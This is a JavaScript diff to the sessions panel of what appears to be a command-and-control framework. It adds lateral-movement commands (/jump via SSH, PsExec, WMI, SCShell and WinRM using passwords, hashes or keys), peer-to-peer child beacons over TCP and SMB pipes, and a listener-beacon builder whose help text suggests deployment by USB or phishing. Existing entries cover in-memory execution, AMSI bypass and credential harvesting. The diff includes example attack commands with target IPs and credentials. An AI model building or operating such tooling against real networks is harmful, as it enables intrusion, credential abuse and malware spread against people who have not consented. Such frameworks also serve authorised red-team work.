@@ -78,7 +78,21 @@ const Sessions = (() => {
     { cmd: '/memexec',   hint: '<file> [args]',             desc: 'Execute PE/ELF in-memory (Win+Linux)' },
     { cmd: '/script',    hint: '<file> [interpreter]',      desc: 'Execute script fileless via stdin pipe (Win+Linux)' },
     { cmd: '/script-amsibypass', hint: '<file> [interpreter]', desc: 'Execute script fileless + AMSI bypass (Win PS only)' },
+    { cmd: '/jump',      hint: '<module> <target> [opts]',   desc: 'Lateral movement — deploy P2P child', req: 2, opts: [
+      { name: 'ssh',               desc: 'SSH — deploy via scp + ssh exec (Linux)' },
+      { name: 'psexec',            desc: 'PsExec — SMB ADMIN$ + service creation (Win)' },
+      { name: 'psexec_psh',        desc: 'PsExec+PS — SMB ADMIN$ + PowerShell exec (Win)' },
+      { name: 'wmi',               desc: 'WMI — SMB ADMIN$ + wmic process create (Win)' },
+      { name: 'scshell',           desc: 'SCShell — hijack existing service binary (Win)' },
+      { name: 'winrm',             desc: 'WinRM — remote exec via winrs (Win)' },
+    ] },
+    { cmd: '/generate-listener', hint: '[opts]',              desc: 'Build standalone P2P listener beacon', opts: [
+      { name: 'tcp',               desc: 'TCP listener (default)' },
+      { name: 'smb',               desc: 'SMB named pipe listener (Windows)' },
+    ] },
     { cmd: '/kill',      hint: '',                          desc: 'Wipe agent + terminate' },
+    { cmd: '/kill-cascade', hint: '',                       desc: 'Kill session + all P2P descendants' },
+    { cmd: '/p2p',         hint: 'link tcp <addr:port> | link smb <target> [pipe] | unlink <guid>',    desc: 'Link/unlink P2P child' },
     { cmd: '/stop',      hint: '',                          desc: 'Stop agent, files remain' },
     { cmd: '/history',   hint: '',                          desc: 'Switch to History tab' },
     { cmd: '/clear',     hint: '',                          desc: 'Clear shell output' },
@@ -285,7 +299,11 @@ const Sessions = (() => {
   }
 
   function _sessionStatus(s) {
-    if (s.polling_stopped) return 'stopped';
+    if (s.p2p_is_internal) return s.state === 'linked' ? 'linked' : (s.state || 'stopped');
+    if (s.polling_stopped) {
+      if (s.state === 'linked') return 'linked';
+      return 'stopped';
+    }
     if (s.state === 'cloud_unreachable') return 'cloud_unreachable'; // LOW-7
     const ts = s._localSeenAt ? String(s._localSeenAt)
              : (s.last_seen_at != null) ? String(s.last_seen_at)
@@ -297,6 +315,7 @@ const Sessions = (() => {
     const dot = '<span class="st-circle"></span>';
     if (st === 'alive')              return `${dot}LIVE`;
     if (st === 'idle')               return `${dot}IDLE`;
+    if (st === 'linked')             return `${dot}LINK`;
     if (st === 'stopped')            return `${dot}STOP`;
     if (st === 'cloud_unreachable')  return `${dot}CLOUD`;
     return `${dot}DEAD`;
@@ -313,11 +332,12 @@ const Sessions = (() => {
 
     const statsEl = $('#pane-sess-stats');
     if (statsEl && ids.length) {
-      let alive = 0, idle = 0, offline = 0, stopped = 0;
+      let alive = 0, idle = 0, offline = 0, stopped = 0, linked = 0;
       ids.forEach(id => {
         const s  = _sessions[id];
         const st = _sessionStatus(s);
         if (st === 'stopped')            { stopped++; return; }
+        if (st === 'linked')             { linked++; return; }
         if (st === 'alive')              alive++;
         else if (st === 'idle')          idle++;
         else                             offline++;  // offline + cloud_unreachable both count as offline in stats
@@ -327,6 +347,7 @@ const Sessions = (() => {
       statsEl.innerHTML =
         chip('ps-alive', alive,   'alive')   +
         chip('ps-idle',  idle,    'idle')    +
+        (linked ? chip('ps-linked', linked, 'linked') : '') +
         chip('ps-off',   offline, 'offline') +
         chip('ps-stop',  stopped, 'stop');
     } else if (statsEl) {
@@ -385,7 +406,9 @@ const Sessions = (() => {
       const lbl = s.label || chan || '';
       const cellMap = {
         status:   `<td><span class="st-pill ${st}">${_stLabel(st)}</span>${lockIcon}</td>`,
-        provider: `<td class="sess-prov">${providerIcon(prov, 'prov-icon')?.outerHTML || ''}${escHtml(_providerLabel(prov))}</td>`,
+        provider: s.p2p_is_internal
+                    ? `<td class="sess-prov">P2P TCP</td>`
+                    : `<td class="sess-prov">${providerIcon(prov, 'prov-icon')?.outerHTML || ''}${escHtml(_providerLabel(prov))}</td>`,
         label:    `<td class="sess-label">${escHtml(lbl || '—')}</td>`,
         id:       `<td class="sess-uid">${escHtml(uid)}</td>`,
         user:     `<td class="sess-user">${escHtml(s.target_user || '—')}${admin ? '<span class="priv-star">*</span>' : ''}</td>`,
@@ -396,8 +419,12 @@ const Sessions = (() => {
         ext_ip:   `<td class="sess-ip">${escHtml(extIp)}</td>`,
         pid:      `<td class="sess-pid">${escHtml(pid)}</td>`,
         process:  `<td class="sess-proc">${escHtml(proc)}</td>`,
-        last_hb:  `<td class="hb-val" data-hb="${escHtml(seenTs)}">${fmtAge(seenTs || null)}</td>`,
-        next_ci:  `<td class="${st === 'stopped' ? 'nc-val nc-stopped' : 'nc-val'}" data-nc="${st === 'stopped' || isNaN(ncMs) ? '' : ncMs}">${st === 'stopped' ? '■ Stopped' : fmtUntil(ncMs)}</td>`,
+        last_hb:  s.p2p_is_internal
+                    ? `<td class="hb-val">∞</td>`
+                    : `<td class="hb-val" data-hb="${escHtml(seenTs)}">${fmtAge(seenTs || null)}</td>`,
+        next_ci:  s.p2p_is_internal
+                    ? `<td class="nc-val">∞</td>`
+                    : `<td class="${st === 'stopped' ? 'nc-val nc-stopped' : 'nc-val'}" data-nc="${st === 'stopped' || isNaN(ncMs) ? '' : ncMs}">${st === 'stopped' ? '■ Stopped' : fmtUntil(ncMs)}</td>`,
       };
       tr.innerHTML = _sessColOrder.map(k => cellMap[k] || '').join('');
       if (s._wiping) {
@@ -427,10 +454,12 @@ const Sessions = (() => {
           const dispTs = s._localSeenAt ? String(s._localSeenAt)
                      : (s.last_seen_at != null) ? String(s.last_seen_at)
                      : (s.last_hb_ts || '');
-          const hbV = $('#sh-meta [data-key="hb"] .v');
-          if (hbV) hbV.textContent = fmtAge(dispTs);
-          const infoHb = document.getElementById('info-hb-val');
-          if (infoHb) infoHb.textContent = fmtAge(dispTs);
+          if (!s.p2p_is_internal) {
+            const hbV = $('#sh-meta [data-key="hb"] .v');
+            if (hbV) hbV.textContent = fmtAge(dispTs);
+            const infoHb = document.getElementById('info-hb-val');
+            if (infoHb) infoHb.textContent = fmtAge(dispTs);
+          }
         }
       }
     }, 1000);
@@ -550,7 +579,9 @@ const Sessions = (() => {
     const dispTs = s._localSeenAt ? String(s._localSeenAt)
                  : (s.last_seen_at != null) ? String(s.last_seen_at)
                  : (s.last_hb_ts || '');
-    const st = s.polling_stopped ? 'stopped' : agentStatus({ last_heartbeat: dispTs }, s.agent_sleep);
+    const st = s.p2p_is_internal ? (s.state === 'linked' ? 'linked' : s.state || 'stopped')
+              : s.polling_stopped ? (s.state === 'linked' ? 'linked' : 'stopped')
+              : agentStatus({ last_heartbeat: dispTs }, s.agent_sleep);
 
     const folder = (s.folder_path || '').replace(/^\/+|\/+$/g, '') || _activeId.slice(0, 8);
     const displayName = s.label || folder;
@@ -562,7 +593,9 @@ const Sessions = (() => {
     if (pill)    pill.className = `status-pill ${st}`;
     if (pillTxt) pillTxt.textContent = st;
 
-    _updatePollBtn(s.polling_stopped);
+    const pollBtn = $('#btn-poll-toggle');
+    if (pollBtn) pollBtn.style.display = s.p2p_is_internal ? 'none' : '';
+    if (!s.p2p_is_internal) _updatePollBtn(s.polling_stopped);
     _updateListenBadge();
 
     const vmWarn = $('#version-mismatch-warn');
@@ -594,13 +627,16 @@ const Sessions = (() => {
     if (promptEl) promptEl.textContent = _prompt(s.target_os, s.agent_process, s.target_privs);
 
     const meta = $('#sh-meta');
-    if (meta) meta.innerHTML = `
+    if (meta) {
+      const isP2P = !!s.p2p_is_internal;
+      meta.innerHTML = `
       <div class="meta-kv"><span class="k">ID</span><span class="v">${escHtml(_activeId)}</span></div>
-      <div class="meta-kv"><span class="k">Provider</span><span class="v">${escHtml(_providerLabel(s.provider))}</span></div>
-      <div class="meta-kv" data-key="hb"><span class="k">Heartbeat</span><span class="v ${st === 'alive' ? 'good' : ''}">${fmtAge(dispTs)}</span></div>
-      <div class="meta-kv"><span class="k">Sleep</span><span class="v">${s.agent_sleep != null ? _fmtDuration(s.agent_sleep) : '?'}</span></div>
-      <div class="meta-kv"><span class="k">Jitter</span><span class="v">${s.agent_jitter != null ? s.agent_jitter + '%' : '?'}</span></div>
+      <div class="meta-kv"><span class="k">Provider</span><span class="v">${isP2P ? 'P2P TCP' : escHtml(_providerLabel(s.provider))}</span></div>
+      <div class="meta-kv" data-key="hb"><span class="k">Heartbeat</span><span class="v ${isP2P ? '' : (st === 'alive' ? 'good' : '')}">${isP2P ? '∞' : fmtAge(dispTs)}</span></div>
+      ${isP2P ? '' : `<div class="meta-kv"><span class="k">Sleep</span><span class="v">${s.agent_sleep != null ? _fmtDuration(s.agent_sleep) : '?'}</span></div>
+      <div class="meta-kv"><span class="k">Jitter</span><span class="v">${s.agent_jitter != null ? s.agent_jitter + '%' : '?'}</span></div>`}
       <div class="meta-kv"><span class="k">OS</span><span class="v">${escHtml(s.target_os || '?')}</span></div>`;
+    }
 
     const pb = $('#pending-bar');
     if (pb) {
@@ -962,6 +998,25 @@ const Sessions = (() => {
           '  /script-amsibypass <file> [interp]  Script + AMSI bypass (Windows PowerShell only)',
           '    HW breakpoint on AmsiScanBuffer before spawning PowerShell. Patchless, same as /assembly-amsibypass.',
           '',
+          '🔗  LATERAL MOVEMENT (P2P)',
+          '  ───────────────────────────────────────────────────────────────────',
+          '  /jump <module> <target> [opts]      Deploy P2P child agent via lateral movement',
+          '    Modules: ssh, psexec, psexec_psh, wmi, scshell, winrm',
+          '    /jump ssh 10.0.1.5 user=root key=/root/.ssh/id_rsa',
+          '    /jump psexec 10.0.1.10 user=admin password=P@ss',
+          '    /jump wmi DC01 user=DOMAIN\\admin hash=aad3b435...',
+          '    Options: user= password= hash= key= port= pipe= service= link= platform=',
+          '',
+          '  /generate-listener [tcp|smb] [linux|windows] [opts]',
+          '                                       Build standalone P2P listener beacon',
+          '    Generates a P2P child binary you can deploy manually (USB, phishing, etc.)',
+          '    The beacon listens for a parent link — connect with /p2p link tcp <addr>',
+          '    /generate-listener tcp linux port=4444',
+          '    /generate-listener smb windows pipe=spool_mgr',
+          '    Options: port= pipe= bind= platform= label=',
+          '',
+          '  /kill-cascade                        Kill session + all P2P descendants (leaf-first)',
+          '',
           '🔑  CREDENTIAL HARVESTING',
           '  ───────────────────────────────────────────────────────────────────',
           '  /creds harvest                     Collect creds (Firefox, cloud, SSH, FileZilla, mRemoteNG, Git...)',
@@ -1252,6 +1307,58 @@ const Sessions = (() => {
         break;
       }
 
+      case '/kill-cascade': {
+        const ok = await confirm('Cascade Kill',
+          'This will kill the session AND all P2P descendants — irreversible. Proceed?');
+        if (!ok) { _setOutput(cmdId, 'Aborted.'); break; }
+        const kc = await API.killCascade(id);
+        if (kc?.ok) {
+          _setOutput(cmdId,
+            `Cascade kill dispatched — ${kc.killed?.length || 0} session(s) killed: ${(kc.killed || []).join(', ') || 'none'}` +
+            (kc.errors?.length ? `\nErrors: ${kc.errors.join('; ')}` : ''));
+          Toast.info(`Cascade kill: ${kc.killed?.length || 0} session(s) terminated`);
+        } else {
+          _setOutput(cmdId, `ERROR: ${kc?.error || 'cascade kill failed'}`);
+        }
+        break;
+      }
+
+      case '/generate-listener': {
+        const glOpts = {};
+        let glBindType = 'tcp';
+        let glPlatform = 'linux';
+        for (const a of args) {
+          const lower = a.toLowerCase();
+          if (lower === 'tcp' || lower === 'smb') { glBindType = lower; continue; }
+          if (lower === 'linux' || lower === 'windows') { glPlatform = lower; continue; }
+          const [k, ...vp] = a.split('=');
+          const v = vp.join('=');
+          if (k && v) glOpts[k.toLowerCase()] = v;
+        }
+        const glParams = {
+          donor_session_id: id,
+          bind_type: glOpts.bind_type || glBindType,
+          platform: glOpts.platform || glPlatform,
+          port: parseInt(glOpts.port || '0', 10) || 0,
+          pipe: glOpts.pipe || '',
+          bind_address: glOpts.bind || glOpts.address || '',
+          label: glOpts.label || '',
+        };
+        const gl = await API.generateListener(glParams);
+        if (gl?.ok) {
+          _setOutput(cmdId,
+            `P2P listener build queued\n` +
+            `  Session:  ${gl.session_id}\n` +
+            `  Bind:     ${gl.bind_type} ${gl.bind_address}\n` +
+            `  Platform: ${gl.platform}\n` +
+            `  Download: ${gl.download_url} (available after build completes)`);
+          Toast.info('P2P Listener', `Building ${gl.platform} ${gl.bind_type} listener…`);
+        } else {
+          _setOutput(cmdId, `ERROR: ${gl?.error || gl?.detail || 'generate-listener failed'}`);
+        }
+        break;
+      }
+
       case '/stop': {
         const d = _checkCmd(await API.sendCommand(id, 'EXIT', '/stop'));
         const rid = d?.cmd_id ? (_promoteIdManual(cmdId, d.cmd_id), d.cmd_id) : cmdId;
@@ -1259,9 +1366,89 @@ const Sessions = (() => {
         break;
       }
 
+      case '/jump': {
+        if (args.length < 2) {
+          _setOutput(cmdId,
+            'Usage: /jump <module> <target> [user=... password=... hash=... key=... port=... pipe=... service=...]\n' +
+            'Modules: ssh, psexec, psexec_psh, wmi, scshell, winrm\n' +
+            'Example: /jump ssh 10.0.1.5 user=root key=/root/.ssh/id_rsa\n' +
+            '         /jump psexec 10.0.1.10 user=admin password=P@ss', true);
+          break;
+        }
+        const mod = args[0].toLowerCase();
+        const tgt = args[1];
+        const jumpOpts = { module: mod, target: tgt };
+        for (let i = 2; i < args.length; i++) {
+          const kv = args[i].split('=');
+          if (kv.length === 2) {
+            const k = kv[0].toLowerCase();
+            if (k === 'user') jumpOpts.user = kv[1];
+            else if (k === 'password' || k === 'pass') jumpOpts.password = kv[1];
+            else if (k === 'hash') jumpOpts.hash = kv[1];
+            else if (k === 'key' || k === 'key_path') jumpOpts.key_path = kv[1];
+            else if (k === 'port') jumpOpts.port = parseInt(kv[1], 10) || 0;
+            else if (k === 'pipe') jumpOpts.pipe = kv[1];
+            else if (k === 'service') jumpOpts.service = kv[1];
+            else if (k === 'link') jumpOpts.link_type = kv[1];
+            else if (k === 'platform') jumpOpts.platform = kv[1];
+          }
+        }
+        try {
+          const jr = await API.jump(id, jumpOpts);
+          if (jr && jr.ok) {
+            _setQueued(cmdId, `jump ${mod} → ${tgt} building agent…`);
+            Toast.info('Jump started', `${mod} → ${tgt} (child: ${(jr.child_session_id || '').slice(0, 8)})`);
+          } else {
+            _setOutput(cmdId, `Jump failed: ${jr?.error || 'unknown error'}`, true);
+          }
+        } catch (e) {
+          _setOutput(cmdId, `Jump error: ${e.message}`, true);
+          Toast.error('Jump failed', e.message);
+        }
+        break;
+      }
+
       case '/history': {
         _switchTab('history');
         _setOutput(cmdId, 'Switched to History tab.');
+        break;
+      }
+
+      case '/p2p': {
+        const sub = (args[0] || '').toLowerCase();
+        if (sub === 'link') {
+          const proto = (args[1] || '').toLowerCase();
+          const addr = args[2] || '';
+          if (!addr) {
+            _setOutput(cmdId, 'Usage: /p2p link tcp <host:port>  |  /p2p link smb <target-ip> [pipe-name]', true);
+            break;
+          }
+          try {
+            let r;
+            if (proto === 'smb') {
+              r = await API.p2pLinkSmb(id, addr, args[3] || '');
+            } else {
+              r = await API.p2pLinkTcp(id, addr);
+            }
+            if (r && r.ok) {
+              _setQueued(cmdId, `P2P link ${proto} ${addr} — queued`);
+            } else {
+              _setOutput(cmdId, `P2P link failed: ${r?.error || r?.locked_by || 'unknown'}`, true);
+            }
+          } catch (e) {
+            _setOutput(cmdId, `P2P link error: ${e.message}`, true);
+          }
+        } else if (sub === 'unlink') {
+          const guid = args[1] || '';
+          if (!guid) { _setOutput(cmdId, 'Usage: /p2p unlink <child-guid>', true); break; }
+          try {
+            const r = await API.p2pUnlink(id, guid);
+            if (r && r.ok) _setQueued(cmdId, `P2P unlink ${guid} — queued`);
+            else _setOutput(cmdId, `P2P unlink failed: ${r?.error || 'unknown'}`, true);
+          } catch (e) { _setOutput(cmdId, `P2P unlink error: ${e.message}`, true); }
+        } else {
+          _setOutput(cmdId, 'Usage: /p2p link tcp <host:port>  |  /p2p link smb <target-ip> [pipe-name]  |  /p2p unlink <guid>', true);
+        }
         break;
       }
 
@@ -2419,9 +2606,12 @@ const Sessions = (() => {
     const privBadge = s.target_privs && ['root','SYSTEM','admin','Administrator'].includes(s.target_privs)
       ? ` <span class="info-badge-priv">${escHtml(s.target_privs)}</span>` : '';
 
+    const _isP2P = !!s.p2p_is_internal;
+    const _srcNote = _isP2P ? 'from P2P checkin' : 'from heartbeat';
+
     inner.innerHTML = `
       <div class="info-section">
-        <div class="info-section-title">Identity <span class="info-title-note">from heartbeat</span></div>
+        <div class="info-section-title">Identity <span class="info-title-note">${_srcNote}</span></div>
         <div class="info-grid">
           ${_cell('Session ID', _activeId)}
           ${_cell('Status', '')}
@@ -2436,16 +2626,16 @@ const Sessions = (() => {
       </div>
 
       <div class="info-section">
-        <div class="info-section-title">Agent <span class="info-title-note">from heartbeat</span></div>
+        <div class="info-section-title">Agent <span class="info-title-note">${_srcNote}</span></div>
         <div class="info-grid">
           ${_cell('PID', s.agent_pid)}
           ${_cell('Process', s.agent_process)}
-          ${_cell('Last Heartbeat', '')}
-          ${_cell('Sleep / Jitter', s.agent_sleep != null ? `${_fmtDuration(s.agent_sleep)} ± ${s.agent_jitter ?? '?'}%` : null)}
+          ${_isP2P ? _cell('Connection', 'Persistent TCP (∞)') : _cell('Last Heartbeat', '')}
+          ${_isP2P ? _cell('Parent', s.p2p_parent_guid ? s.p2p_parent_guid.slice(0, 8) + '…' : '—') : _cell('Sleep / Jitter', s.agent_sleep != null ? `${_fmtDuration(s.agent_sleep)} ± ${s.agent_jitter ?? '?'}%` : null)}
         </div>
       </div>
 
-      <div class="info-section">
+      ${_isP2P ? '' : `<div class="info-section">
         <div class="info-section-title">Dead-Drop Channel <span class="info-title-note">from heartbeat</span></div>
         <div class="info-grid">
           ${_cell('Provider', _providerLabel(s.provider))}
@@ -2458,7 +2648,7 @@ const Sessions = (() => {
           ${_cell('Label', s.label)}
           ${(s.s2_uploaded_at && !s.s2_deleted) ? `<div class="info-cell"><div class="info-k">Stage2</div><div class="info-v" style="color:var(--warn,#e6a817)" title="Stage2 still on cloud — server cancels it at first heartbeat">⚠ On cloud since ${new Date(s.s2_uploaded_at).toLocaleTimeString()}</div></div>` : ''}
         </div>
-      </div>
+      </div>`}
 
       <div class="info-section">
         <div class="info-section-title">Guardrails <span class="info-title-note">baked at deploy time</span></div>
@@ -3584,6 +3774,79 @@ const Sessions = (() => {
         } finally {
           lockBtn.disabled = false;
         }
+      });
+    }
+
+    const genBtn = $('#btn-gen-listener');
+    if (genBtn) {
+      genBtn.addEventListener('click', () => {
+        if (!_activeId) return;
+        const s = _sessions[_activeId];
+        if (!s) return;
+
+        const osHint = (s.target_os || '').toLowerCase();
+        const plat = $('#p2p-f-platform');
+        if (plat) plat.value = osHint.includes('windows') ? 'windows' : 'linux';
+
+        const bt = $('#p2p-f-bind-type');
+        const ifaceEl = $('#p2p-f-iface');
+        const portEl = $('#p2p-f-port');
+        const pipeEl = $('#p2p-f-pipe');
+        const lblIface = $('#p2p-lbl-iface');
+        const lblPort = $('#p2p-lbl-port');
+        const lblPipe = $('#p2p-lbl-pipe');
+        if (bt) {
+          bt.value = 'tcp';
+          bt.onchange = () => {
+            const isSMB = bt.value === 'smb';
+            if (ifaceEl) ifaceEl.style.display = isSMB ? 'none' : '';
+            if (lblIface) lblIface.style.display = isSMB ? 'none' : '';
+            if (portEl) portEl.style.display = isSMB ? 'none' : '';
+            if (lblPort) lblPort.style.display = isSMB ? 'none' : '';
+            if (pipeEl) pipeEl.style.display = isSMB ? '' : 'none';
+            if (lblPipe) lblPipe.style.display = isSMB ? '' : 'none';
+          };
+          bt.onchange();
+        }
+        if (ifaceEl) ifaceEl.value = '0.0.0.0';
+        if (portEl) portEl.value = '';
+        if (pipeEl) pipeEl.value = '';
+        const labelEl = $('#p2p-f-label');
+        if (labelEl) labelEl.value = '';
+
+        const goBtn = $('#p2p-gen-go');
+        if (goBtn) {
+          const newGo = goBtn.cloneNode(true);
+          goBtn.replaceWith(newGo);
+          newGo.addEventListener('click', async () => {
+            newGo.disabled = true;
+            try {
+              const iface = ifaceEl?.value?.trim() || '0.0.0.0';
+              const port = parseInt(portEl?.value || '0', 10) || 0;
+              const bindAddr = bt?.value === 'smb' ? '' : (port ? `${iface}:${port}` : '');
+              const gl = await API.generateListener({
+                donor_session_id: _activeId,
+                bind_type: bt?.value || 'tcp',
+                platform: plat?.value || 'linux',
+                port: port,
+                pipe: pipeEl?.value || '',
+                bind_address: bindAddr,
+                label: labelEl?.value || '',
+              });
+              Modal.close('p2p-gen-modal');
+              if (gl?.ok) {
+                Toast.info('P2P Listener', `Building ${gl.platform} ${gl.bind_type} listener — session ${gl.session_id}`);
+              } else {
+                Toast.error('P2P Listener', gl?.error || gl?.detail || 'generate-listener failed');
+              }
+            } catch (e) {
+              Toast.error('P2P Listener', e.message || String(e));
+            } finally {
+              newGo.disabled = false;
+            }
+          });
+        }
+        Modal.open('p2p-gen-modal');
       });
     }
 
